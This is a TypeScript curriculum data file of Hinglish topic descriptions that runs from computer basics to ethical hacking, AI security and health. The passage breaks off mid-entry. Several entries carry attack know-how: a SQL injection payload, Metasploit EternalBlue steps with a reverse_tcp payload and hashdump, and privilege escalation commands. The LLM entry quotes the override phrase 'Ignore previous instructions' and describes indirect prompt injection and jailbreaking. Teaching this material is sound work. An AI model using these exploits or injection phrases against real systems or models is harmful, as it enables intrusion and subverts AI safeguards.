export interface Topic {
  id: string;
  phase: string;
  category: string;
  title: string;
  description: string;
  level: "beginner" | "intermediate" | "advanced";
  order: number;
}

export const curriculum: Topic[] = [
  // Phase 1: Computer Basics
  {
    id: "cb-01", phase: "Phase 1: Computer Basics", category: "Hardware", title: "What is a Computer?", level: "beginner", order: 1,
    description: "Computer ek electronic machine hai jo data ko process karta hai. CPU (processor) iska brain hai — saari calculations yahi karta hai. RAM temporary memory hai — jab tum koi app kholte ho, woh RAM mein load hoti hai. Storage (HDD/SSD) permanent memory hai — files, videos, OS sab yahan rehta hai. Motherboard sabko ek saath connect karta hai — bina iske kuch kaam nahi karta.",
  },
  {
    id: "cb-02", phase: "Phase 1: Computer Basics", category: "Hardware", title: "Input & Output Devices", level: "beginner", order: 2,
    description: "Input devices woh hain jo computer mein data bhejte hain — jaise keyboard (type karne ke liye), mouse (click ke liye), scanner, microphone. Output devices woh hain jo result dikhate hain — jaise monitor (screen), printer, speaker. USB ek universal port hai jisme mouse, keyboard, pendrive sab lagta hai. HDMI se monitor ya TV se connect karte hain.",
  },
  {
    id: "cb-03", phase: "Phase 1: Computer Basics", category: "Software", title: "Operating System Basics", level: "beginner", order: 3,
    description: "Operating System (OS) woh software hai jo computer ko chalata hai — Windows, Linux, macOS. Yeh hardware aur user ke beech kaam karta hai. OS processes manage karta hai (ek saath kai programs chalana), file system handle karta hai (files organize karna), aur user interface deta hai (jo tum screen pe dekhte ho). Bina OS ke computer sirf ek box hai.",
  },
  {
    id: "cb-04", phase: "Phase 1: Computer Basics", category: "Software", title: "File Systems & Storage", level: "beginner", order: 4,
    description: "File system batata hai ki hard drive pe files kaise store aur organize hoti hain. Windows mein NTFS use hota hai (permissions, encryption support karta hai), older devices mein FAT32 (pen drives, SD cards). Linux mein ext4 common hai. Jab tum file save karte ho, OS file system ko batata hai ki disk ke kis block mein data likhna hai.",
  },
  {
    id: "cb-05", phase: "Phase 1: Computer Basics", category: "Binary & Data", title: "Binary & Number Systems", level: "beginner", order: 5,
    description: "Computer sirf 0 aur 1 samajhta hai — ise binary kehte hain. Har 0 ya 1 ek bit hai. 8 bits mila ke 1 byte banta hai. Humans decimal (0-9) use karte hain, computers binary (0-1). Hex (0-F) bhi important hai — memory addresses aur colors hex mein likhte hain. Example: decimal 10 = binary 1010 = hex A.",
  },
  {
    id: "cb-06", phase: "Phase 1: Computer Basics", category: "Binary & Data", title: "Data Units & Encoding", level: "beginner", order: 6,
    description: "1 byte = 8 bits. 1 KB = 1024 bytes, 1 MB = 1024 KB, 1 GB = 1024 MB. ASCII ek encoding hai jisme har character ko ek number se represent karte hain — 'A' = 65. Unicode (UTF-8) extended version hai jisme Hindi, Chinese, emoji sab support hota hai. Jab tum koi text file save karte ho, woh actually numbers ki list hoti hai disk pe.",
  },

  // Phase 2: Networking
  {
    id: "net-01", phase: "Phase 2: Networking", category: "Fundamentals", title: "What is a Network?", level: "beginner", order: 1,
    description: "Network matlab computers ko aapas mein jodna taaki data share ho sake. LAN (Local Area Network) ek ghar ya office mein hota hai. WAN (Wide Area Network) cities ya countries ko jointa hai — internet ek global WAN hai. Data packets mein travel karta hai — chhote chhote tukdon mein divide ho ke jaata hai aur destination pe rejoin hota hai.",
  },
  {
    id: "net-02", phase: "Phase 2: Networking", category: "Fundamentals", title: "IP Addresses & Subnetting", level: "beginner", order: 2,
    description: "IP address har device ka unique address hai network pe — jaise ghar ka address. IPv4 jaise 192.168.1.1 (4 numbers, dots se alag). IPv6 longer hai kyunki IPv4 addresses khatam ho rahe hain. Subnet mask batata hai network ka size — 255.255.255.0 matlab 256 devices ek network mein. CIDR notation: 192.168.1.0/24 matlab same cheez hai.",
  },
  {
    id: "net-03", phase: "Phase 2: Networking", category: "Fundamentals", title: "Ports & Protocols", level: "beginner", order: 3,
    description: "Port ek virtual door hai computer pe — different services alag ports pe sunte hain. HTTP port 80 pe kaam karta hai, HTTPS port 443 pe, SSH port 22 pe, FTP port 21 pe. TCP reliable hai — data confirm karke bhejta hai (web browsing). UDP fast hai par guaranteed delivery nahi — gaming aur video call mein use hota hai.",
  },
  {
    id: "net-04", phase: "Phase 2: Networking", category: "Protocols", title: "OSI & TCP/IP Model", level: "intermediate", order: 4,
    description: "OSI model 7 layers mein network communication explain karta hai: Physical (cables), Data Link (MAC addresses), Network (IP), Transport (TCP/UDP), Session, Presentation, Application. TCP/IP model simplified version hai — 4 layers. Jab tum email bhejte ho, message Application layer se shuru ho ke Physical tak jaata hai, aur receiver pe ulta hota hai.",
  },
  {
    id: "net-05", phase: "Phase 2: Networking", category: "Protocols", title: "DNS, DHCP & ARP", level: "intermediate", order: 5,
    description: "DNS internet ka phone book hai — google.com ko 142.250.80.46 (IP) mein convert karta hai. DHCP automatically IP address deta hai jab tum WiFi se connect hote ho — isliye manually IP nahi likhna padta. ARP local network pe MAC address dhundta hai — IP se MAC address map karta hai. Ye teeno protocols bina rukke background mein kaam karte hain.",
  },
  {
    id: "net-06", phase: "Phase 2: Networking", category: "Protocols", title: "HTTP & HTTPS", level: "intermediate", order: 6,
    description: "HTTP (HyperText Transfer Protocol) web ka base hai — browser aur server ke beech baat hoti hai. GET request se page maangta hai, POST se data bhejta hai (login form etc). HTTP mein data plaintext jaata hai — koi bhi dekh sakta hai. HTTPS mein TLS encryption hoti hai — data scrambled hota hai. HTTPS lock icon browser mein dikhta hai.",
  },
  {
    id: "net-07", phase: "Phase 2: Networking", category: "Tools", title: "Network Tools (ping, nmap, Wireshark)", level: "intermediate", order: 7,
    description: "Ping check karta hai ki koi device online hai ya nahi — ICMP packets bhejta hai. Traceroute path dikhata hai data ka destination tak. Nmap port scanner hai — kisi bhi computer ke open ports aur services dhundta hai. Wireshark network sniffer hai — live network traffic pakad ke analyze kar sakte ho. Ye tools penetration testers aur admins dono use karte hain.",
  },
  {
    id: "net-08", phase: "Phase 2: Networking", category: "Tools", title: "Firewalls & VPNs", level: "intermediate", order: 8,
    description: "Firewall ek guard hai jo incoming aur outgoing network traffic check karta hai — rules ke basis pe allow ya block karta hai. Hardware firewall router mein hota hai, software firewall OS mein (Windows Defender etc). VPN (Virtual Private Network) ek encrypted tunnel banata hai — tumhara traffic VPN server se hoke jaata hai, isliye ISP nahi dekh sakta. VPN IP bhi hide karta hai.",
  },
  {
    id: "net-09", phase: "Phase 2: Networking", category: "Advanced", title: "Packet Analysis", level: "advanced", order: 9,
    description: "Packet analysis matlab network ke raw data packets ko pakad ke padhna. Wireshark isme sabse popular tool hai. Tum dekh sakte ho ki kaunsa device kahan connect kar raha hai, HTTP requests ka full content, unencrypted passwords, aur suspicious traffic. Filters use karo jaise 'http', 'tcp.port==22', 'ip.addr==192.168.1.1'. Ethical hacking mein MITM attacks samajhne ke liye zaroori hai.",
  },
  {
    id: "net-10", phase: "Phase 2: Networking", category: "Advanced", title: "Routing & BGP Basics", level: "advanced", order: 10,
    description: "Router packet ko ek network se doosre network tak forward karta hai — routing table dekh ke decide karta hai kahan bhejni hai. Static routing manually configure hoti hai, dynamic routing (OSPF, RIP) automatically update hoti hai. BGP (Border Gateway Protocol) internet ka backbone hai — ISPs aur large networks ke beech routing handle karta hai. Internet ke bina BGP nahi chalta.",
  },

  // Phase 3: OS & Linux
  {
    id: "os-01", phase: "Phase 3: Operating Systems & Linux", category: "Linux Basics", title: "Linux Introduction & Installation", level: "beginner", order: 1,
    description: "Linux open-source OS hai — free mein milta hai aur modify kar sakte ho. Ubuntu beginners ke liye, Kali Linux ethical hacking ke liye, Debian stable servers ke liye use hota hai. Linux mostly servers pe chalta hai — 90% internet servers Linux use karte hain. VirtualBox ya VMware pe install kar ke seekh sakte ho bina main OS ko touch kiye. Bootable USB se bhi try kar sakte ho.",
  },
  {
    id: "os-02", phase: "Phase 3: Operating Systems & Linux", category: "Linux Basics", title: "Linux Command Line Fundamentals", level: "beginner", order: 2,
    description: "Linux terminal mein commands type karke kaam karte hain. ls — current folder ki files dikhao. cd foldername — folder mein jaao. mkdir name — naya folder banao. rm file — file delete karo (careful!). cp source dest — copy karo. mv old new — move ya rename karo. pwd — current location dikhao. cat file — file ka content dikhao. Tab key se auto-complete hota hai — bahut helpful hai.",
  },
  {
    id: "os-03", phase: "Phase 3: Operating Systems & Linux", category: "Linux Basics", title: "File Permissions & Users", level: "beginner", order: 3,
    description: "Linux mein har file ke 3 permissions hote hain: read (r), write (w), execute (x). Aur 3 levels: owner, group, others. 'chmod 755 file' matlab owner sab kar sakta hai, baaki sirf read aur execute. 'sudo' se admin (root) level commands chalate hain. 'chown user file' se ownership change karte hain. Root user sabse powerful user hai — har cheez access kar sakta hai.",
  },
  {
    id: "os-04", phase: "Phase 3: Operating Systems & Linux", category: "Linux Intermediate", title: "Processes & System Monitoring", level: "intermediate", order: 4,
    description: "Process ek running program hai. 'ps aux' se saare processes dekho. 'top' ya 'htop' se real-time CPU aur RAM usage dekho. 'kill PID' se process band karo (PID = process ID number). 'kill -9 PID' forcefully band karta hai. 'df -h' se disk space dekho. 'free -h' se RAM dekho. System monitoring important hai — agar koi suspicious process chal raha ho toh pata chalega.",
  },
  {
    id: "os-05", phase: "Phase 3: Operating Systems & Linux", category: "Linux Intermediate", title: "Shell Scripting (Bash)", level: "intermediate", order: 5,
    description: "Bash script commands ka ek file mein collection hai jo ek saath run hota hai. Shebang line se start hota hai: #!/bin/bash. Variables: name='Twh', echo $name. If-else: if [ $x -eq 5 ]; then echo 'yes'; fi. For loop: for i in 1 2 3; do echo $i; done. Scripts se automation hota hai — daily backup, log analysis, IP scanner sab script se ban sakta hai.",
  },
  {
    id: "os-06", phase: "Phase 3: Operating Systems & Linux", category: "Linux Intermediate", title: "Package Management", level: "intermediate", order: 6,
    description: "Package manager software install karne ka tool hai. Ubuntu/Debian mein: apt install nmap, apt update, apt upgrade. CentOS/RHEL mein: yum install nmap. Python packages ke liye: pip install requests. 'apt remove' se uninstall karo, 'apt autoremove' se unused dependencies hatao. Repositories online stores hain jahan packages hote hain — internet se download hota hai.",
  },
  {
    id: "os-07", phase: "Phase 3: Operating Systems & Linux", category: "Linux Advanced", title: "Linux Networking & SSH", level: "advanced", order: 7,
    description: "ifconfig ya ip addr se network interfaces aur IP dekho. netstat -tuln se open ports dekho. SSH (Secure Shell) se remote computer mein login karte hain: 'ssh user@ip'. SSH keys se password-less login — private key tumhare paas, public key server pe. iptables Linux ka built-in firewall hai — rules se traffic allow/deny karo. Port forwarding se remote ports local pe map hote hain.",
  },
  {
    id: "os-08", phase: "Phase 3: Operating Systems & Linux", category: "Linux Advanced", title: "System Hardening", level: "advanced", order: 8,
    description: "Hardening matlab server ko attack se bachana. Root login SSH se band karo (PermitRootLogin no). Fail2ban install karo — brute force attacks pe IP automatically ban hoti hai. UFW firewall configure karo — sirf zaroori ports kholo. Regular updates karo — 'apt upgrade'. Unnecessary services band karo. Logs regularly check karo (/var/log/auth.log). SSH ke liye password nahi, keys use karo.",
  },

  // Phase 4: Programming
  {
    id: "prog-01", phase: "Phase 4: Programming", category: "Python Basics", title: "Python Introduction", level: "beginner", order: 1,
    description: "Python simple aur powerful language hai — cybersecurity, AI, web sab mein use hoti hai. Variable: name = 'Twh'. Print: print('Hello'). Input: x = input('Name: '). Data types: int (5), float (3.14), string ('hello'), bool (True/False). Python indentation pe kaam karta hai — spaces se blocks define hote hain. 'python3 file.py' se run karo terminal mein.",
  },
  {
    id: "prog-02", phase: "Phase 4: Programming", category: "Python Basics", title: "Control Flow & Functions", level: "beginner", order: 2,
    description: "If-else: if x > 5: print('bada hai') else: print('chhota hai'). For loop: for i in range(10): print(i). While loop: while True — tab tak chalta hai jab tak break na ho. Function: def greet(name): return 'Hello ' + name. Functions code ko reusable banate hain. Recursion: function apne aap ko call kare — useful but careful (infinite loop ka risk).",
  },
  {
    id: "prog-03", phase: "Phase 4: Programming", category: "Python Basics", title: "Lists, Dicts & File I/O", level: "beginner", order: 3,
    description: "List ordered collection hai: ips = ['192.168.1.1', '10.0.0.1']. Dictionary key-value pairs: user = {'name': 'Twh', 'role': 'admin'}. File read: open('file.txt', 'r').read(). File write: open('out.txt', 'w').write('data'). JSON: import json, json.loads() aur json.dumps(). Hacking scripts mein IP lists, scan results, credentials sab lists aur dicts mein store hote hain.",
  },
  {
    id: "prog-04", phase: "Phase 4: Programming", category: "Python Intermediate", title: "Object-Oriented Python", level: "intermediate", order: 4,
    description: "OOP mein class ek blueprint hai aur object ek instance. class Tool: def __init__(self, name): self.name = name. Inheritance: class Scanner(Tool) — Scanner ke paas Tool ke sab features hain plus apne. Encapsulation: data hide karte hain (__private variables). OOP se bade projects organized rehte hain. Metasploit aur Burp Suite jaise tools OOP se bane hain.",
  },
  {
    id: "prog-05", phase: "Phase 4: Programming", category: "Python Intermediate", title: "Python for Networking (socket, requests)", level: "intermediate", order: 5,
    description: "Socket module se raw TCP/UDP connections banate hain — port scanner, chat app, reverse shell sab socket se. import socket; s = socket.socket(); s.connect(('ip', port)). Requests library se HTTP calls: requests.get('https://url'). Response: r.status_code, r.text, r.json(). In dono se network tools banate hain — basic port scanner Python mein 5 lines mein likha ja sakta hai.",
  },
  {
    id: "prog-06", phase: "Phase 4: Programming", category: "Python Advanced", title: "Scripting for Automation", level: "advanced", order: 6,
    description: "argparse se command-line arguments lete hain — professional tools ki tarah. import argparse; parser.add_argument('--target', help='IP address'). Os module se system commands chalao: os.system('ping target'). Subprocess se output capture karo. Threading se multiple tasks parallel chalao — 100 ports ek saath scan karo. Automation se time bachta hai — ek baar script banao, hazaaron baar use karo.",
  },
  {
    id: "prog-07", phase: "Phase 4: Programming", category: "Other Languages", title: "JavaScript Basics", level: "beginner", order: 7,
    description: "JavaScript browser mein chalta hai — web pages ko interactive banata hai. Variables: let x = 5; const name = 'Twh'. Functions: function greet() { return 'Hi'; }. DOM: document.getElementById('id') se HTML elements pakdo. Fetch API: fetch('/api/data').then(r => r.json()). XSS attacks JS code inject karke karte hain — isliye JS samajhna web security ke liye zaroori hai.",
  },
  {
    id: "prog-08", phase: "Phase 4: Programming", category: "Other Languages", title: "SQL Basics", level: "beginner", order: 8,
    description: "SQL se databases se data maangna, daalna, update karna aur delete karna hota hai. SELECT * FROM users; — saare users dekho. INSERT INTO users (name) VALUES ('Twh'); — naya user add karo. UPDATE users SET role='admin' WHERE id=1; — update karo. DELETE FROM users WHERE id=5; — delete karo. WHERE clause se filter karo. Databases everywhere hain — login systems, shopping carts, social media sab SQL use karte hain.",
  },
  {
    id: "prog-09", phase: "Phase 4: Programming", category: "Other Languages", title: "SQL Injection Deep Dive", level: "advanced", order: 9,
    description: "SQL Injection (SQLi) sabse common aur dangerous web attack hai. Jab user input bina check kiye SQL query mein daal do: SELECT * FROM users WHERE name='$input'. Agar input ho: ' OR 1=1-- toh query sab users return karta hai. Types: Union-based (data extract), Blind (true/false se pata lagana), Time-based. Prevention: parameterized queries aur prepared statements. sqlmap tool automatically SQLi dhundta hai.",
  },

  // Phase 5: Web Development
  {
    id: "web-01", phase: "Phase 5: Web Development", category: "Frontend", title: "HTML & CSS Fundamentals", level: "beginner", order: 1,
    description: "HTML webpage ka structure banata hai — tags se: <h1> heading, <p> paragraph, <a> link, <form> form. CSS styling karta hai — colors, fonts, layout. Selector: h1 { color: red; }. Flexbox aur Grid se layout banate hain. Responsive design matlab mobile pe bhi sahi dikhe — media queries se hota hai. Browser developer tools (F12) se live HTML/CSS edit kar ke dekh sakte ho.",
  },
  {
    id: "web-02", phase: "Phase 5: Web Development", category: "Frontend", title: "JavaScript & DOM Manipulation", level: "intermediate", order: 2,
    description: "DOM (Document Object Model) HTML ka tree structure hai jo JS manipulate kar sakta hai. document.querySelector('#btn').addEventListener('click', function). Fetch API se server se data laao: fetch('/api').then(r=>r.json()).then(data=>console.log(data)). LocalStorage mein data browser mein save hota hai. Event listeners se user actions handle karo. XSS attack mein yahi JS inject hoti hai — isliye DOM samajhna zaroori hai.",
  },
  {
    id: "web-03", phase: "Phase 5: Web Development", category: "Backend", title: "How Web Servers Work", level: "intermediate", order: 3,
    description: "Web server client ke requests sunata hai aur response deta hai. Apache aur Nginx popular servers hain — static files serve karte hain, reverse proxy bhi karte hain. Node.js se JavaScript ko server pe chalate hain. Request ka lifecycle: browser DNS lookup karta hai → TCP connect karta hai → HTTP request bhejta hai → server response deta hai → browser render karta hai. Headers mein server info leak ho sakti hai — security risk.",
  },
  {
    id: "web-04", phase: "Phase 5: Web Development", category: "Backend", title: "REST APIs & JSON", level: "intermediate", order: 4,
    description: "REST API ek interface hai jisse applications data exchange karte hain. HTTP methods: GET (data maango), POST (data bhejo), PUT (update), DELETE (hatao). JSON format: {'name': 'Twh', 'role': 'admin'}. API authentication: API keys, JWT tokens, OAuth. Postman ya curl se APIs test karte hain. Har modern app mein APIs hain — Instagram, Google, banking sab REST APIs use karte hain. API security testing important hai.",
  },
  {
    id: "web-05", phase: "Phase 5: Web Development", category: "Security Concepts", title: "Web Security Basics", level: "intermediate", order: 5,
    description: "CORS (Cross-Origin Resource Sharing) control karta hai ki kaunsi websites tumhare API se data le sakti hain. Cookies mein session data store hota hai — HttpOnly flag se JS access nahi kar sakta, Secure flag se sirf HTTPS pe jaata hai. SameSite se CSRF attacks rokta hai. HTTPS mandatory hai — HTTP pe data plaintext jaata hai. Security headers: Content-Security-Policy, X-Frame-Options, HSTS.",
  },
  {
    id: "web-06", phase: "Phase 5: Web Development", category: "Security Concepts", title: "OWASP Top 10", level: "advanced", order: 6,
    description: "OWASP Top 10 sabse critical web vulnerabilities ki list hai. XSS (Cross-Site Scripting) — malicious JS inject karo. SQL Injection — database attack. Broken Authentication — weak passwords, no MFA. IDOR (Insecure Direct Object Reference) — doosre users ka data access. Security Misconfiguration — default passwords, exposed configs. Cryptographic Failures — plaintext sensitive data. Ye sab real attacks mein use hote hain.",
  },

  // Phase 6: Cybersecurity Fundamentals
  {
    id: "sec-01", phase: "Phase 6: Cybersecurity Fundamentals", category: "Core Concepts", title: "CIA Triad & Security Models", level: "beginner", order: 1,
    description: "Cybersecurity ki foundation 3 pillars pe hai — CIA Triad. Confidentiality: data sirf authorized log dekh sakein (encryption se achieve hota hai). Integrity: data modify na ho bina permission ke (hashing se verify karte hain). Availability: system accessible rahe jab chahiye (backups, redundancy se). Har security decision mein ye teeno consider hote hain. Example: ransomware availability attack hai.",
  },
  {
    id: "sec-02", phase: "Phase 6: Cybersecurity Fundamentals", category: "Core Concepts", title: "Types of Cyber Attacks", level: "beginner", order: 2,
    description: "Phishing — fake email ya website se credentials churana. Ransomware — files encrypt karke paisa maangna (WannaCry famous attack tha). DDoS — lakhs requests ek saath bhej ke server band karna. MITM (Man-in-the-Middle) — beech mein ghus ke communication padhna/modify karna. Social Engineering — insaan ko fool karna technical attack se zyada dangerous hai. Brute Force — passwords guess karna ek ek karke.",
  },
  {
    id: "sec-03", phase: "Phase 6: Cybersecurity Fundamentals", category: "Core Concepts", title: "Cryptography Basics", level: "intermediate", order: 3,
    description: "Symmetric encryption: ek hi key se encrypt aur decrypt — AES fast aur secure hai. Asymmetric encryption: public key se encrypt, private key se decrypt — RSA SSL/TLS mein use hota hai. Hashing: one-way function — MD5 (outdated), SHA-256 (passwords ke liye). Salt: password hash se pehle random string milao — rainbow table attacks rokta hai. HTTPS mein TLS handshake symmetric aur asymmetric dono use karta hai.",
  },
  {
    id: "sec-04", phase: "Phase 6: Cybersecurity Fundamentals", category: "Defense", title: "Incident Response & Forensics", level: "intermediate", order: 4,
    description: "Incident response ek structured process hai attack handle karne ka. Steps: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned. Forensics mein evidence collect karte hain bina tamper kiye — disk image, memory dump, logs. Chain of custody maintain karna zaroori hai legal proceedings ke liye. Timeline analysis se attack reconstruct hota hai. Log timestamps critical hain.",
  },
  {
    id: "sec-05", phase: "Phase 6: Cybersecurity Fundamentals", category: "Defense", title: "SIEM & Log Analysis", level: "intermediate", order: 5,
    description: "SIEM (Security Information and Event Management) saari logs ek jagah collect karta hai — Splunk, ELK Stack, IBM QRadar popular tools hain. Logs mein attack ke signs hote hain — failed logins, unusual traffic, privilege escalation. Correlation rules se related events join karte hain attack detect karne ke liye. Alert fatigue real problem hai — bahut zyada false positives. Log retention important hai compliance ke liye.",
  },
  {
    id: "sec-06", phase: "Phase 6: Cybersecurity Fundamentals", category: "Defense", title: "Security Compliance & Laws (India)", level: "advanced", order: 6,
    description: "IT Act 2000 India ka main cyber law hai — unauthorized access, hacking, cyber fraud sab illegal hai. CERT-In (Indian Computer Emergency Response Team) cyber incidents handle karta hai. PDPB (Personal Data Protection Bill) GDPR ki tarah personal data protect karta hai. Bug bounty programs legal permission dete hain ethical hacking ke liye — bina permission ke 'ethical' hacking bhi crime hai. Always written permission lo.",
  },

  // Phase 7: Ethical Hacking
  {
    id: "hack-01", phase: "Phase 7: Ethical Hacking", category: "Methodology", title: "Ethical Hacking Introduction & CEH", level: "beginner", order: 1,
    description: "Ethical hacker (white hat) company ki permission se unke systems hack karta hai — vulnerabilities dhundne ke liye. Black hat criminal hacker hai. CEH (Certified Ethical Hacker) popular certification hai. Pentest methodology: Reconnaissance → Scanning → Gaining Access → Maintaining Access → Covering Tracks → Reporting. Bug bounty programs (HackerOne, Bugcrowd) pe legal aur paid hacking kar sakte ho.",
  },
  {
    id: "hack-02", phase: "Phase 7: Ethical Hacking", category: "Methodology", title: "Reconnaissance & OSINT", level: "intermediate", order: 2,
    description: "Recon matlab target ke baare mein information ikattha karna bina touch kiye. Passive recon: Google dorking (site:target.com filetype:pdf), Shodan (internet-connected devices dhundhta hai), LinkedIn se employees dhundna, WHOIS se domain info. Active recon: nmap scan, ping. OSINT (Open Source Intelligence) public info se intelligence banana. theHarvester, Maltego, Recon-ng popular tools hain.",
  },
  {
    id: "hack-03", phase: "Phase 7: Ethical Hacking", category: "Scanning", title: "Vulnerability Scanning", level: "intermediate", order: 3,
    description: "Vulnerability scanner automatically known vulnerabilities dhundta hai. Nessus (most popular, commercial) aur OpenVAS (free) network scanners hain. Nikto web server vulnerabilities scan karta hai — outdated software, misconfigurations. Scanner ki report mein CVE numbers hote hain (Common Vulnerabilities and Exposures). CVSS score batata hai vulnerability kitni serious hai (0-10). False positives manually verify karne padte hain.",
  },
  {
    id: "hack-04", phase: "Phase 7: Ethical Hacking", category: "Scanning", title: "Port Scanning & Enumeration", level: "intermediate", order: 4,
    description: "nmap sabse powerful port scanner hai. nmap -sV target — services aur versions detect karo. nmap -O target — OS fingerprint. nmap -A target — aggressive scan (OS, version, scripts, traceroute). Stealth scan: nmap -sS (SYN scan — connection complete nahi karta, IDS se bachne ke liye). Enumeration matlab services se info extract karna — banner grabbing, SMB enumeration, SNMP enumeration.",
  },
  {
    id: "hack-05", phase: "Phase 7: Ethical Hacking", category: "Exploitation", title: "Metasploit Framework", level: "advanced", order: 5,
    description: "Metasploit sabse popular exploitation framework hai — thousands of exploits built-in hain. msfconsole se start karo. search ms17_010 — vulnerability dhundo (EternalBlue/WannaCry wala). use exploit/windows/smb/ms17_010_eternalblue. set RHOSTS target_ip. set PAYLOAD windows/meterpreter/reverse_tcp. set LHOST tumhara_ip. exploit. Meterpreter shell milne pe: hashdump (password hashes), sysinfo, screenshot.",
  },
  {
    id: "hack-06", phase: "Phase 7: Ethical Hacking", category: "Exploitation", title: "Web App Hacking (Burp Suite)", level: "advanced", order: 6,
    description: "Burp Suite web application testing ka Swiss army knife hai. Proxy mode mein browser ka traffic intercept karta hai — requests modify kar sakte ho bhejne se pehle. Repeater se same request baar baar modify kar ke bhejte hain. Intruder se brute force aur fuzzing karte hain. Scanner (Pro version) automatically vulnerabilities dhundta hai. Spider se website ke saare pages map hote hain. OWASP challenges pe practice karo.",
  },
  {
    id: "hack-07", phase: "Phase 7: Ethical Hacking", category: "Exploitation", title: "Mobile App Security Testing", level: "advanced", order: 7,
    description: "Android apps APK files hoti hain — jadoo se install hoti hain. APK decompile karne ke liye: jadx ya apktool. Hardcoded API keys, passwords code mein dhundho. Frida dynamic instrumentation tool hai — running app ka code modify kar sakte ho. Objection (Frida pe based) se SSL pinning bypass, root detection bypass, runtime manipulation. OWASP Mobile Top 10 mobile security ke liye reference hai.",
  },
  {
    id: "hack-08", phase: "Phase 7: Ethical Hacking", category: "Post-Exploitation", title: "Privilege Escalation", level: "advanced", order: 8,
    description: "Initial access ke baad attacker low-privilege user hota hai — root/admin banana hota hai. Linux privesc: SUID binaries dhundho (find / -perm -4000), sudo -l (kya sudo se chal sakta hai), cron jobs check karo, kernel exploits. Windows privesc: AlwaysInstallElevated registry, unquoted service paths, DLL hijacking. LinPEAS aur WinPEAS automated scripts hain jo privesc vectors automatically dhundte hain.",
  },
  {
    id: "hack-09", phase: "Phase 7: Ethical Hacking", category: "Post-Exploitation", title: "Report Writing & Documentation", level: "advanced", order: 9,
    description: "Pentest report client ko batati hai ki kya mila aur kaise fix karein. Executive Summary non-technical log ke liye — business impact pe focus. Technical findings: vulnerability name, severity (Critical/High/Medium/Low/Info), proof of concept (screenshots, steps), CVSS score, remediation. Good report findings reproduce karne ki steps clearly batata hai. Professional report hi consultant ki real value dikhata hai.",
  },

  // Phase 8: AI & Machine Learning
  {
    id: "ai-01", phase: "Phase 8: AI & Machine Learning", category: "Foundations", title: "What is AI & Machine Learning?", level: "beginner", order: 1,
    description: "AI matlab machine ko intelligent banana — rules hardcode nahi karte, machine khud seekhti hai data se. Machine Learning: data do → model train karo → predictions karo. Supervised learning: labeled data se seekhna (spam detection). Unsupervised: patterns khud dhundhe (clustering). Reinforcement: reward/punishment se seekhna (games). ChatGPT ek LLM (Large Language Model) hai — text data pe trained neural network.",
  },
  {
    id: "ai-02", phase: "Phase 8: AI & Machine Learning", category: "Foundations", title: "Python for Data Science (NumPy, Pandas)", level: "intermediate", order: 2,
    description: "NumPy se arrays aur mathematical operations fast hote hain — ML ka backbone hai. Pandas se tabular data (CSV files) load aur analyze karte hain — DataFrame concept. Matplotlib/Seaborn se graphs banate hain. Workflow: data load karo (pd.read_csv) → clean karo (nulls hatao) → analyze karo → visualize karo → model train karo. Kaggle pe free datasets hain practice ke liye.",
  },
  {
    id: "ai-03", phase: "Phase 8: AI & Machine Learning", category: "Foundations", title: "Machine Learning Algorithms", level: "intermediate", order: 3,
    description: "Linear Regression: continuous values predict karta hai (price prediction). Logistic Regression: classification ke liye (spam ya nahi). Decision Tree: ek tree banata hai decisions ke liye — interpretable. Random Forest: bahut saare trees ka ensemble — better accuracy. Neural Networks: brain ki tarah layers mein — deep learning ka base. scikit-learn Python library mein ye sab algorithms ready hain — kuch lines mein use kar sakte ho.",
  },
  {
    id: "ai-04", phase: "Phase 8: AI & Machine Learning", category: "AI in Security", title: "AI for Threat Detection", level: "advanced", order: 4,
    description: "AI cybersecurity mein use hota hai: malware detection (patterns se), network intrusion detection, user behavior analytics (UEBA — normal se alag behavior alert karta hai), email phishing detection. Anomaly detection — normal baseline banao, usse alag kuch bhi alert. False positive rate important metric hai — zyada alerts = fatigue. Security tools jaise CrowdStrike, Darktrace AI use karte hain real-time threat hunting ke liye.",
  },
  {
    id: "ai-05", phase: "Phase 8: AI & Machine Learning", category: "AI in Security", title: "LLMs & Prompt Injection", level: "advanced", order: 5,
    description: "LLM (Large Language Model) jaise ChatGPT, Gemini text generate karte hain — billions of parameters pe trained. Prompt Injection attack mein attacker malicious instructions inject karta hai — 'Ignore previous instructions and...' Indirect prompt injection: website pe text likhdo jo jab AI padhe toh instructions execute kare. Jailbreaking: safety filters bypass karna. AI systems bhi vulnerable hain — new attack surface hai security ke liye.",
  },
  {
    id: "ai-06", phase: "Phase 8: AI & Machine Learning", category: "Building AI", title: "Building a Simple AI Tool", level: "advanced", order: 6,
    description: "Practical AI tool banana: OpenAI/Gemini API se text generation. Python mein: import google.generativeai as genai; model = genai.GenerativeModel('gemini-pro'); response = model.generate_content('prompt'). Security use cases: automated log analysis, vulnerability description generator, phishing email detector, code review bot. APIs ke billing monitor karo — galti se bahut requests bhejne pe bill aa sakta hai.",
  },

  // Phase 9: Health & Productivity
  {
    id: "health-01", phase: "Phase 9: Health & Productivity", category: "Physical Health", title: "Posture & Ergonomics for Developers", level: "beginner", order: 1,
    description: "Ghalat posture se back pain, neck pain, carpal tunnel ho sakta hai — developers ki common problem. Monitor eye level pe hona chahiye (oopar nahi, neeche nahi). Chair mein 90° angle pe baitho — feet flat on floor. Keyboard aur mouse close rakho — kamar pe strain na pade. Wrist straight rakho type karte waqt. Har 30-45 min pe uthke thoda chalo. Lumbar support bahut important hai.",
  },
  {
    id: "health-02", phase: "Phase 9: Health & Productivity", category: "Physical Health", title: "Eye Care & Screen Time", level: "beginner", order: 2,
    description: "20-20-20 rule: har 20 minute baad, 20 feet (6 meter) door kisi cheez ko 20 second dekho — eye strain kam hota hai. Screen brightness room light ke equal rakho — bahut bright ya bahut dim dono bura hai. Dark mode se थोड़ा aaram milta hai raat ko. Blue light filter (Night Shift/Night Mode) enable karo sone se pehle. Blink rate kam ho jaata hai screen dekhe time — consciously blink karo. Yearly eye checkup karo.",
  },
  {
    id: "health-03", phase: "Phase 9: Health & Productivity", category: "Physical Health", title: "Exercise Routine for Tech Workers", level: "beginner", order: 3,
    description: "Desk job mein sitting disease real hai — back muscles weak hote hain, circulation kam hoti hai. Daily: 30 min walk/jog minimum. Desk exercises: neck rolls, shoulder shrugs, wrist stretches. Plank aur core exercises back pain rokते hain. Standing desk ek option hai — zyada time khade raho. Gym nahi ja sakte? Bodyweight exercises — pushups, squats, lunges ghar pe ho sakte hain. Movement = better blood flow = better thinking.",
  },
  {
    id: "health-04", phase: "Phase 9: Health & Productivity", category: "Mental Performance", title: "Focus & Deep Work Techniques", level: "intermediate", order: 4,
